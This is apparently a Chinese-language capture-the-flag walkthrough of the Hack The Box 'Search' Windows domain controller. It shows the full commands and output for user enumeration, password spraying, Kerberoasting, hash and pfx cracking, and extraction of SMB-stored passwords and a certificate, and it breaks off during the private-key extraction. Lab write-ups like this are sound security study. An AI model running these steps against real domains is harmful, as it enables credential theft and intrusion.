---
title: Search
pagination_prev: null
pagination_next: null
---

## 信息收集

### 端口扫描

~~~
┌──(kali㉿kali)-[~/htb/Search]
└─$ cat nmap/ports.nmap 
# Nmap 7.94SVN scan initiated Wed Feb  5 08:06:54 2025 as: /usr/lib/nmap/nmap -sT -p- --min-rate 2000 -oA nmap/ports 10.10.11.129
Nmap scan report for 10.10.11.129
Host is up (0.19s latency).
Not shown: 65519 filtered tcp ports (no-response)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
8172/tcp  open  unknown
49667/tcp open  unknown
49675/tcp open  unknown
49698/tcp open  unknown

# Nmap done at Wed Feb  5 08:08:01 2025 -- 1 IP address (1 host up) scanned in 66.49 seconds

~~~

~~~
┌──(kali㉿kali)-[~/htb/Search]
└─$ cat nmap/sC.nmap   
# Nmap 7.94SVN scan initiated Wed Feb  5 08:18:21 2025 as: /usr/lib/nmap/nmap -sT -sV -sC -p 53,80,88,135,139,389,443,445,464,636,3268,3269,8172,49667,49675,49698 -oA nmap/sC 10.10.11.129
Nmap scan report for 10.10.11.129
Host is up (0.20s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Search &mdash; Just Testing IIS
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-02-05 13:01:53Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-05T13:03:24+00:00; -16m36s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
443/tcp   open  ssl/http      Microsoft IIS httpd 10.0
|_ssl-date: 2025-02-05T13:03:24+00:00; -16m36s from scanner time.
|_http-title: Search &mdash; Just Testing IIS
| tls-alpn: 
|_  http/1.1
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-05T13:03:23+00:00; -16m37s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-05T13:03:24+00:00; -16m36s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: search.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2025-02-05T13:03:24+00:00; -16m36s from scanner time.
| ssl-cert: Subject: commonName=research
| Not valid before: 2020-08-11T08:13:35
|_Not valid after:  2030-08-09T08:13:35
8172/tcp  open  ssl/http      Microsoft IIS httpd 10.0
| tls-alpn: 
|_  http/1.1
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Site doesn't have a title.
| ssl-cert: Subject: commonName=WMSvc-SHA2-RESEARCH
| Not valid before: 2020-04-07T09:05:25
|_Not valid after:  2030-04-05T09:05:25
|_ssl-date: 2025-02-05T13:03:23+00:00; -16m37s from scanner time.
49667/tcp open  msrpc         Microsoft Windows RPC
49675/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49698/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: RESEARCH; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-02-05T13:02:46
|_  start_date: N/A
|_clock-skew: mean: -16m36s, deviation: 0s, median: -16m36s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Feb  5 08:20:02 2025 -- 1 IP address (1 host up) scanned in 101.20 seconds

~~~

~~~
┌──(kali㉿kali)-[~/htb/Search]
└─$ cat nmap/vuln.nmap 
# Nmap 7.94SVN scan initiated Wed Feb  5 08:18:28 2025 as: /usr/lib/nmap/nmap -sT --script=vuln -p 53,80,88,135,139,389,443,445,464,636,3268,3269,8172,49667,49675,49698 -oA nmap/vuln 10.10.11.129
Pre-scan script results:
| broadcast-avahi-dos: 
|   Discovered hosts:
|     224.0.0.251
|   After NULL UDP avahi packet DoS (CVE-2011-1002).
|_  Hosts are all up (not vulnerable).
Nmap scan report for 10.10.11.129
Host is up (0.18s latency).

PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
| http-fileupload-exploiter: 
|   
|     Couldn't find a file-type field.
|   
|_    Couldn't find a file-type field.
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.11.129
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: http://10.10.11.129:80/
|     Form id: fname
|     Form action: #
|     
|     Path: http://10.10.11.129:80/
|     Form id: button-addon2
|_    Form action: #
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
443/tcp   open  https
|_http-dombased-xss: Couldn't find any DOM based XSS.
| http-csrf: 
| Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=10.10.11.129
|   Found the following possible CSRF vulnerabilities: 
|     
|     Path: https://10.10.11.129:443/
|     Form id: fname
|     Form action: #
|     
|     Path: https://10.10.11.129:443/
|     Form id: button-addon2
|_    Form action: #
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
8172/tcp  open  unknown
49667/tcp open  unknown
49675/tcp open  unknown
49698/tcp open  unknown

Host script results:
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: ERROR
|_smb-vuln-ms10-054: false

# Nmap done at Wed Feb  5 08:28:32 2025 -- 1 IP address (1 host up) scanned in 603.90 seconds

~~~

### Web 80 信息收集
没什么特别的一个静态页面

![](Pasted_image_20250205222037.png)

搜集一下用户名

~~~users
Keely.Lyons
Dax.Santiago
Sierra.Frye
Kyla.Stewart
Kaiara.Spencer
Dave.Simpson
Ben.Thompson
Chris.Stewart
~~~

目录扫描看起来也没啥
~~~
┌──(kali㉿kali)-[~/htb/Search/username-anarchy]
└─$ gobuster dir -u http://search.htb -w /usr/share/dirb/wordlists/big.txt              
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://search.htb
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/dirb/wordlists/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/Images               (Status: 301) [Size: 148] [--> http://search.htb/Images/]
/certenroll           (Status: 301) [Size: 152] [--> http://search.htb/certenroll/]
/css                  (Status: 301) [Size: 145] [--> http://search.htb/css/]
/fonts                (Status: 301) [Size: 147] [--> http://search.htb/fonts/]
/images               (Status: 301) [Size: 148] [--> http://search.htb/images/]
/js                   (Status: 301) [Size: 144] [--> http://search.htb/js/]
/staff                (Status: 403) [Size: 1233]
Progress: 20469 / 20470 (100.00%)
===============================================================
Finished
===============================================================
                                                                                          
~~~

### Web 443 信息收集
看起来似乎和80的页面一模一样
查看证书信息有一个research，暂且当用户名用着
![](Pasted_image_20250205222516.png)


### Kerberos 枚举与凭据获取
使用搜集的用户字典进行kerbrute，发现四个有效的用户名
~~~
(python3.9) ┌──(kali㉿kali)-[~/htb/Search/kerbrute]
└─$ ./kerbrute userenum -d search.htb --dc 10.10.11.129 ../users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 02/05/25 - Ronnie Flathers @ropnop

2025/02/05 09:25:58 >  Using KDC(s):
2025/02/05 09:25:58 >   10.10.11.129:88

2025/02/05 09:25:58 >  [+] VALID USERNAME:       Keely.Lyons@search.htb
2025/02/05 09:25:58 >  [+] VALID USERNAME:       Dax.Santiago@search.htb
2025/02/05 09:25:58 >  [+] VALID USERNAME:       Sierra.Frye@search.htb
2025/02/05 09:25:58 >  [+] VALID USERNAME:       research@search.htb
2025/02/05 09:25:58 >  Done! Tested 9 usernames (4 valid) in 0.116 seconds
~~~

枚举了大半天，一无所获，于是把web上的所有图片下载下来，用exiftool查看也没有结果

但是注意到有两张相同的照片

![](Pasted_image_20250206122655.png)

![](Pasted_image_20250206122709.png)

这明显多了什么东西

识别一下，看起来是类似提醒事项的东西

~~~
Working from Home
Key staff to stay
Hospital appointment
11:45
Harrods
Phisher Walter
Send password to Hope Sharp
IsolationIsKey?
meeting with Board
Hanter and Jordan
~~~

Hope Sharp可能是一个人名？用nxc测试一下

~~~
┌──(kali㉿kali)-[~/htb/Search/kerbrute]
└─$ ./kerbrute userenum -d search.htb --dc 10.10.11.129 ../users

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: dev (n/a) - 02/06/25 - Ronnie Flathers @ropnop

2025/02/06 00:19:02 >  Using KDC(s):
2025/02/06 00:19:02 >   10.10.11.129:88

2025/02/06 00:19:02 >  [+] VALID USERNAME:       Dax.Santiago@search.htb
2025/02/06 00:19:02 >  [+] VALID USERNAME:       Keely.Lyons@search.htb
2025/02/06 00:19:02 >  [+] VALID USERNAME:       Sierra.Frye@search.htb
2025/02/06 00:19:02 >  [+] VALID USERNAME:       hope.sharp@search.htb
2025/02/06 00:19:02 >  [+] VALID USERNAME:       research@search.htb
2025/02/06 00:19:02 >  Done! Tested 10 usernames (5 valid) in 0.153 seconds
~~~

确实是一个人名，再测一下密码IsolationIsKey?
确实是hope sharp的密码，我们终于得到了一组凭据
hope.sharp:IsolationIsKey?

~~~
┌──(kali㉿kali)-[~/htb/Search/kerbrute]
└─$ nxc smb 10.10.11.129 -u ../users -p 'IsolationIsKey?'       
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Keely.Lyons:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Dax.Santiago:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Sierra.Frye:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Kyla.Stewart:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Kaiara.Spencer:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Dave.Simpson:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Ben.Thompson:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Chris.Stewart:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\research:IsolationIsKey? STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\hope.sharp:IsolationIsKey? 

~~~

smbmap进行枚举

~~~
┌──(kali㉿kali)-[~/htb/Search]
└─$ smbmap -H 10.10.11.129 -u hope.sharp -p 'IsolationIsKey?'  

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.129:445        Name: search.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        CertEnroll                                              READ ONLY       Active Directory Certificate Services share
        helpdesk                                                NO ACCESS
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        RedirectedFolders$                                      READ, WRITE
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections                                                                                                     
                                                                                                         
~~~

检查了一番没有什么有价值的信息

## 漏洞利用

### Kerberoasting 与 横向移动

试一下用这组凭据进行kerberoast，发现可以对用户web_svc进行kerberoast
~~~
┌──(kali㉿kali)-[~/htb/Search]                                                                                                                                                                                                              
└─$ impacket-GetUserSPNs search.htb/hope.sharp:'IsolationIsKey?' -dc-ip 10.10.11.129 -outputfile roasthash                                                                                                                                  
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies                                                                                                                                                                       
                                                                                                                                                                                                                                            
ServicePrincipalName               Name     MemberOf  PasswordLastSet             LastLogon  Delegation                                                                                                                                     
---------------------------------  -------  --------  --------------------------  ---------  ----------                                                                                                                                     
RESEARCH/web_svc.search.htb:60001  web_svc            2020-04-09 08:59:11.329031  <never>                                                                                                                                                   
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
                                                                                                                                                                                                                                            
[-] CCache file is not found. Skipping...
~~~

利用hashcat解密，得到web_svc的密码@3ONEmillionbaby
~~~
hashcat -m 13100 roasthash /usr/share/wordlists/rockyou.txt
~~~

用bloodhound找了一全没法找到路径，做一下思考
web_svc是一个服务账号，可能某一个用户同时拥有一个日常用账号和工作用账号

用ldap搜集出用户名字典，然后利用已知的两组密码进行密码喷射,果然得到一个新的用户Edgar.Jacobs:@3ONEmillionbaby

~~~
┌──(kali㉿kali)-[~/htb/Search/kerbrute]                               └─$ nxc smb 10.10.11.129 -u ldapusers -p ldappass                                                                                                                                                                                           
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)                                                                           
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Santino.Benjamin:@3ONEmillionbaby STATUS_LOGON_FAILURE                                                                                                                   
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Payton.Harmon:@3ONEmillionbaby STATUS_LOGON_FAILURE                                                                                                                      
...                                                                                                              
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Savanah.Knox:@3ONEmillionbaby STATUS_LOGON_FAILURE  
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Frederick.Cuevas:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Marshall.Skinner:@3ONEmillionbaby STATUS_LOGON_FAILURE 
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Edgar.Jacobs:@3ONEmillionbaby 

~~~

在bloodhound中发现Edgar这个用户属于helpdesk组，之前smb的共享里也有个helpdesk，使用smamap看看有没有权限访问，发现是可读的

~~~
┌──(kali㉿kali)-[~/htb/Search/kerbrute]
└─$ smbmap -H 10.10.11.129 -u Edgar.Jacobs -p '@3ONEmillionbaby' -shares

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.5 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                          
                                                                                                                             
[+] IP: 10.10.11.129:445        Name: search.htb                Status: Authenticated
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        CertEnroll                                              READ ONLY       Active Directory Certificate Services share
        helpdesk                                                READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        RedirectedFolders$                                      READ, WRITE
        SYSVOL                                                  READ ONLY       Logon server share 
[*] Closed 1 connections                                                                                                     
                                                                                                        
~~~

查看共享发现居然是空的

~~~
┌──(kali㉿kali)-[~/htb/Search]
└─$ smbclient  //10.10.11.129/helpdesk --user Edgar.Jacobs%'@3ONEmillionbaby'
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  Dc        0  Tue Apr 14 06:24:23 2020
  ..                                 Dc        0  Tue Apr 14 06:24:23 2020

                3246079 blocks of size 4096. 692069 blocks available
smb: \> 

~~~

再访问一下RedirectedFolders$看看有什么
发现有一个xlsx表格，下载下来转为csv

~~~
┌──(kali㉿kali)-[~/htb/Search]
└─$ smbclient  //10.10.11.129/RedirectedFolders$ --user Edgar.Jacobs%'@3ONEmillionbaby'
Try "help" to get a list of possible commands.
smb: \> cd edgar.jacobs\
smb: \edgar.jacobs\> dir
  .                                  Dc        0  Thu Apr  9 16:04:11 2020
  ..                                 Dc        0  Thu Apr  9 16:04:11 2020
  Desktop                           DRc        0  Mon Aug 10 06:02:16 2020
  Documents                         DRc        0  Mon Aug 10 06:02:17 2020
  Downloads                         DRc        0  Mon Aug 10 06:02:17 2020

                3246079 blocks of size 4096. 691470 blocks available
smb: \edgar.jacobs\> cd Desktop\
smb: \edgar.jacobs\Desktop\> dir
  .                                 DRc        0  Mon Aug 10 06:02:16 2020
  ..                                DRc        0  Mon Aug 10 06:02:16 2020
  $RECYCLE.BIN                     DHSc        0  Thu Apr  9 16:05:29 2020
  desktop.ini                      AHSc      282  Mon Aug 10 06:02:16 2020
  Microsoft Edge.lnk                 Ac     1450  Thu Apr  9 16:05:03 2020
  Phishing_Attempt.xlsx              Ac    23130  Mon Aug 10 06:35:44 2020

                3246079 blocks of size 4096. 691470 blocks available

~~~

![](Pasted_image_20250206192353.png)

~~~
┌──(kali㉿kali)-[~/htb/Search]
└─$ cat xlsxpass | awk -F ',' '{print $4}{print $3}'
Payton.Harmon
;;36!cried!INDIA!year!50;;
Cortez.Hickman
..10-time-TALK-proud-66..
Bobby.Wolf
??47^before^WORLD^surprise^91??
Margaret.Robinson
//51+mountain+DEAR+noise+83//
Scarlett.Parks
++47|building|WARSAW|gave|60++
Eliezer.Jordan
!!05_goes_SEVEN_offer_83!!
Hunter.Kirby
~~27%when%VILLAGE%full%00~~
Sierra.Frye
$$49=wide=STRAIGHT=jordan=28$$18
Annabelle.Wells
==95~pass~QUIET~austria~77==
Eve.Galvan
//61!banker!FANCY!measure!25//
Jeramiah.Fritz
??40:student:MAYOR:been:66??
Abby.Gonzalez
&&75:major:RADIO:state:93&&
Joy.Costa
**30*venus*BALL*office*42**
Vincent.Sutton
**24&moment&BRAZIL&members&66**

~~~

做一下验证

~~~
┌──(kali㉿kali)-[~/htb/Search]                                                                                                                                                                                                              
└─$ nxc smb 10.10.11.129 -u user.txt -p pass.txt                                                                                                                                                                                            
SMB         10.10.11.129    445    RESEARCH         [*] Windows 10 / Server 2019 Build 17763 x64 (name:RESEARCH) (domain:search.htb) (signing:True) (SMBv1:False)                                                                           
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Payton.Harmon:;;36!cried!INDIA!year!50;; STATUS_LOGON_FAILURE                                                                                                            
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Cortez.Hickman:;;36!cried!INDIA!year!50;; STATUS_LOGON_FAILURE                                                                                                           
SMB         10.10.11.129    445    RESEARCH         [-] search.htb\Bobby.Wolf:;;36!cried!INDIA!year!50;; STATUS_LOGON_FAILURE                
SMB         10.10.11.129    445    RESEARCH         [+] search.htb\Sierra.Frye:$$49=wide=STRAIGHT=jordan=28$$18 

~~~
得到userflag
~~~
smb: \sierra.frye\> dir
  .                                  Dc        0  Wed Nov 17 20:01:46 2021
  ..                                 Dc        0  Wed Nov 17 20:01:46 2021
  Desktop                           DRc        0  Wed Nov 17 20:08:00 2021
  Documents                         DRc        0  Fri Jul 31 10:42:19 2020
  Downloads                         DRc        0  Fri Jul 31 10:45:36 2020
  user.txt                           Ac       33  Wed Nov 17 19:55:27 2021

                3246079 blocks of size 4096. 690075 blocks available
smb: \sierra.frye\> mget user.txt 
~~~

Downloads里有个backup，下载下来
~~~

smb: \sierra.frye\Downloads\Backups\> dir                                                                                                                                                                                                   
  .                                 DHc        0  Mon Aug 10 16:39:17 2020                                                                                                                                                                  
  ..                                DHc        0  Mon Aug 10 16:39:17 2020                                                                                                                                                                  
  search-RESEARCH-CA.p12             Ac     2643  Fri Jul 31 11:04:11 2020                                                                                                                                                                  
  staff.pfx                          Ac     4326  Mon Aug 10 16:39:17 2020                                                                                                                                                                  
                                                                                                                                                                                                                                            
                3246079 blocks of size 4096. 690045 blocks available                                                                                                                                                                        
smb: \sierra.frye\Downloads\Backups\> mget search-RESEARCH-CA.p12                                                                                                                                                                           
Get file search-RESEARCH-CA.p12? y                                                                                                                                                                                                          
getting file \sierra.frye\Downloads\Backups\search-RESEARCH-CA.p12 of size 2643 as search-RESEARCH-CA.p12 (5.1 KiloBytes/sec) (average 5.1 KiloBytes/sec)                                                                                   
smb: \sierra.frye\Downloads\Backups\> mget staff.pfx                                                                                                                                                                                        
Get file staff.pfx? y                                                                                                                                                                                                                       
getting file \sierra.frye\Downloads\Backups\staff.pfx of size 4326 as staff.pfx (8.7 KiloBytes/sec) (average 6.9 KiloBytes/sec)        
~~~

下载下来一个pfx文件和一个p12文件

破解pfx文件

~~~

┌──(kali㉿kali)-[~/htb/Search]
└─$ pfx2john  staff.pfx > staff.pfx.hash

┌──(kali㉿kali)-[~/htb/Search]
└─$ john staff.pfx.hash --wordlist=/usr/share/wordlists/rockyou.txt                                                                                                                                                                        
Using default input encoding: UTF-8
Loaded 1 password hash (pfx, (.pfx, .p12) [PKCS#12 PBE (SHA1/SHA2) 512/512 AVX512BW 16x])
Cost 1 (iteration count) is 2000 for all loaded hashes
Cost 2 (mac-type [1:SHA1 224:SHA224 256:SHA256 384:SHA384 512:SHA512]) is 1 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
misspissy        (staff.pfx)     
1g 0:00:00:21 DONE (2025-02-06 06:49) 0.04576g/s 251008p/s 251008c/s 251008C/s mistel..missnono
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

~~~

从pfx解密出证书

~~~
┌──(kali㉿kali)-[~/htb/Search]                                        └─$ openssl pkcs12 -in staff.pfx -clcerts -nokeys -out staff_cert.pem       Enter Import Password:  
~~~

~~~
┌──(kali㉿kali)-[~/htb/Search]
└─$ cat staff_cert.pem 
Bag Attributes
    localKeyID: 01 00 00 00 
subject=DC=htb, DC=search, OU=Sites, OU=Birmingham, OU=Users, CN=Sierra Frye
issuer=DC=htb, DC=search, CN=search-RESEARCH-CA
-----BEGIN CERTIFICATE-----
MIIGJjCCBQ6gAwIBAgITVAAAABAGNkQeNjp57QAAAAAAEDANBgkqhkiG9w0BAQsF
ADBKMRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPyLGQBGRYGc2VhcmNo
MRswGQYDVQQDExJzZWFyY2gtUkVTRUFSQ0gtQ0EwHhcNMjAwODEwMjAyNzE0WhcN
MzAwODA4MjAyNzE0WjB4MRMwEQYKCZImiZPyLGQBGRYDaHRiMRYwFAYKCZImiZPy
LGQBGRYGc2VhcmNoMQ4wDAYDVQQLEwVTaXRlczETMBEGA1UECxMKQmlybWluZ2hh
bTEOMAwGA1UECxMFVXNlcnMxFDASBgNVBAMTC1NpZXJyYSBGcnllMIIBIjANBgkq
hkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA3x4cwB5a3MXth7OvHQQmDpNe5XJVXSeb
sDgK68A5gBKNGCjJ4OgL76cVdQYtYtCH5NYd43PiMaeROlo6104WLiQkTA4UGg2V
1c4oPS1F6zw6UBshK2VFo+GF9qcjTt26Mu0a0vSYrmcwXkF55q9TFAcQO86VlWcC
Eaomwo7Uxif8v7xtzBaBFVcEeRdtcHarpQkz58ar9271NszU+xHJysZiuzzt+GQV
64dlzfZ2U/ptCEAX0C26S1kM2Bbw3pIGovg1yDySXI61CLxVsyiEVgN9177aBXZc
lzvyQnE1S8TxF+PCBGDS14VvQxPG3JrfPIKe4FZG8NBilm5FKxeOwQIDAQABo4IC
1TCCAtEwOwYJKwYBBAGCNxUHBC4wLAYkKwYBBAGCNxUIiqtJhPy8daWfG4eDzFyF
kswxgWm881SGjP4oAgFkAgEOMBMGA1UdJQQMMAoGCCsGAQUFBwMCMA4GA1UdDwEB
/wQEAwIFoDAbBgkrBgEEAYI3FQoEDjAMMAoGCCsGAQUFBwMCMEQGCSqGSIb3DQEJ
DwQ3MDUwDgYIKoZIhvcNAwICAgCAMA4GCCqGSIb3DQMEAgIAgDAHBgUrDgMCBzAK
BggqhkiG9w0DBzAdBgNVHQ4EFgQUDZLieQj606CVonkzz3mlkfHE4e0wHwYDVR0j
BBgwFoAUapGteyhvtUimWzjOvGKqX+dX7FAwgdAGA1UdHwSByDCBxTCBwqCBv6CB
vIaBuWxkYXA6Ly8vQ049c2VhcmNoLVJFU0VBUkNILUNBLENOPVJlc2VhcmNoLENO
PUNEUCxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1D
b25maWd1cmF0aW9uLERDPXNlYXJjaCxEQz1odGI/Y2VydGlmaWNhdGVSZXZvY2F0
aW9uTGlzdD9iYXNlP29iamVjdENsYXNzPWNSTERpc3RyaWJ1dGlvblBvaW50MIHD
BggrBgEFBQcBAQSBtjCBszCBsAYIKwYBBQUHMAKGgaNsZGFwOi8vL0NOPXNlYXJj
aC1SRVNFQVJDSC1DQSxDTj1BSUEsQ049UHVibGljJTIwS2V5JTIwU2VydmljZXMs
Q049U2VydmljZXMsQ049Q29uZmlndXJhdGlvbixEQz1zZWFyY2gsREM9aHRiP2NB
Q2VydGlmaWNhdGU/YmFzZT9vYmplY3RDbGFzcz1jZXJ0aWZpY2F0aW9uQXV0aG9y
aXR5MDEGA1UdEQQqMCigJgYKKwYBBAGCNxQCA6AYDBZTaWVycmEuRnJ5ZUBzZWFy
Y2guaHRiMA0GCSqGSIb3DQEBCwUAA4IBAQBICGUNTr7tygnpe3wbCyIoaF7sXnas
nsBNFqURfsxWlHmqgvWRL5DhvEzE7p9iFVEA14ChBZD4LyXFFPRXEeW9oSXGFf94
XpI/lokr2+xlmQndIPgZwFagQicFaJ6pcruo89EiOTemvdDVv8xhm0Lwa51XvpIi
HQo2glvfM4U/jqhl8FJMKBmdrQD150Ssyd2OfU7+e8GhBlMaA6DrqFaySm9AejuA
dpu1myB2lYXb7tGeTb3o/nBIqu7lyPx/ljuc/nAVXHmGungVaZCrcrjtrfaXuek8
dYe+lDSlCYqYcDcke8IDpaGY5kks4LzUqwRs7YUlQNNih62kvwlyYIEJ
-----END CERTIFICATE-----
~~~

从pfx提取出私钥

~~~
┌──(kali㉿kali)-[~/htb/Search]
└─$ openssl pkcs12 -in staff.pfx -nocerts -nodes -out staff_pri.pem
Enter Import Password:
                                                                                                                                                                                                                                            
┌──(kali㉿kali)-[~/htb/Search]
└─$ cat staff_pri.pem 
Bag Attributes
    localKeyID: 01 00 00 00 
    Microsoft CSP Name: Microsoft Enhanced Cryptographic Provider v1.0
    friendlyName: te-ITSecOps-42ad83c7-07ac-4daa-b273-be11dd691da5
Key Attributes
    X509v3 Key Usage: 10 
